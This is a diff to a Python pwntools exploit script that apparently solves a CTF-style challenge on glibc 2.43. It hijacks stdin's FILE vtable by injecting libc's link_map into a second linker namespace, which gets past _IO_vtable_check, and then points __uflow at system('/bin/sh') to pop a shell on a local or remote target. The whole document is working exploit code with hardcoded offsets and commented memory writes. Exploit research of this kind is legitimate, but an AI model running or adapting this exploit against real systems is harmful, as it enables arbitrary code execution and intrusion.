@@ -6,6 +6,10 @@ Bypasses _IO_vtable_check by moving libc's link_map into namespace 1.
 The vtable validator sees l_ns != 0 and accepts the forged vtable.
 
 Target: glibc 2.43 x86_64, Full RELRO + BIND_NOW + PIE + NX
+
+Usage:
+  python3 solve.py                    # local ./vuln
+  python3 solve.py host:port          # remote
 """
 from pwn import *
 import time
@@ -13,10 +17,10 @@ import time
 context.arch = "amd64"
 context.log_level = "info"
 
-# glibc 2.43 x86_64 — shared across builds
+# glibc 2.43-2ubuntu2 x86_64
 STDIN_IN_LIBC  = 0x2128e0
 SYSTEM_OFF     = 0x5c560
-LD_DRIFT       = 0x18720     # ld_base - stdin
+LD_DRIFT       = 0x18720     # ld_base - stdin (build constant)
 RG_IN_LD       = 0x3d000     # _rtld_global in ld
 VDSO_LM_IN_LD  = 0x3e8c0    # vdso link_map in ld
 NS_SIZE        = 0x70        # sizeof(struct link_namespaces) in 2.43
@@ -24,20 +28,16 @@ DL_NNS_OFF     = 0x700      # 16 * NS_SIZE
 FAKE_VT        = 0x200
 UFLOW_SLOT     = 0x28
 
-# These depend on the binary (number of loaded DSOs affects link_map placement)
-OFFSETS = {
-    "local": {"LM": 0xe980, "LM_LNS": 0xe9b0},   # ./vuln (local build)
-    "dist":  {"LM": 0xe8e0, "LM_LNS": 0xe910},    # ./dist/ret2namespace
-}
+# link_map offset from stdin — depends on the number of loaded DSOs.
+# These values are for the vuln.c PoC compiled locally against glibc 2.43.
+# Recompute with the offset probe script if targeting a different binary.
+LM_FROM_STDIN  = 0xe980
+LM_LNS         = 0xe9b0
 
 
-def exploit(target=None, mode="local"):
-    off = OFFSETS[mode]
-
+def exploit(target=None):
     if target:
         p = remote(*target)
-    elif mode == "dist":
-        p = process("./dist/ret2namespace")
     else:
         p = process("./vuln")
 
@@ -47,7 +47,7 @@ def exploit(target=None, mode="local"):
     p.recvline()
 
     libc_base = stdin_addr - STDIN_IN_LIBC
-    libc_lm   = stdin_addr + off["LM"]
+    libc_lm   = stdin_addr + LM_FROM_STDIN
     system    = libc_base + SYSTEM_OFF
     rg        = LD_DRIFT + RG_IN_LD
 
@@ -62,16 +62,16 @@ def exploit(target=None, mode="local"):
             wb(o + i, b)
 
     # namespace injection
-    wq(LD_DRIFT + VDSO_LM_IN_LD + 0x18, 0)
-    wb(off["LM_LNS"], 1)
-    wq(rg + NS_SIZE, libc_lm)
-    wb(rg + DL_NNS_OFF, 2)
+    wq(LD_DRIFT + VDSO_LM_IN_LD + 0x18, 0)   # unlink libc from ns0
+    wb(LM_LNS, 1)                              # libc_lm->l_ns = 1
+    wq(rg + NS_SIZE, libc_lm)                  # ns[1]._ns_loaded
+    wb(rg + DL_NNS_OFF, 2)                     # dl_nns = 2
 
     # fake vtable + trigger
-    wq(FAKE_VT + UFLOW_SLOT, system)
+    wq(FAKE_VT + UFLOW_SLOT, system)           # __uflow → system
     for i, b in enumerate(b"/bin/sh\x00"):
-        wb(i, b)
-    wq(0xd8, stdin_addr + FAKE_VT)
+        wb(i, b)                                # stdin → "/bin/sh"
+    wq(0xd8, stdin_addr + FAKE_VT)             # vtable → fake
 
     time.sleep(0.3)
     p.sendline(b"BREAK")
@@ -83,10 +83,9 @@ def exploit(target=None, mode="local"):
 
 if __name__ == "__main__":
     import sys
-    mode = "dist" if "--dist" in sys.argv else "local"
     target = None
     for arg in sys.argv[1:]:
-        if ":" in arg and not arg.startswith("-"):
+        if ":" in arg:
             host, port = arg.rsplit(":", 1)
             target = (host, int(port))
-    exploit(target=target, mode=mode)
+    exploit(target=target)
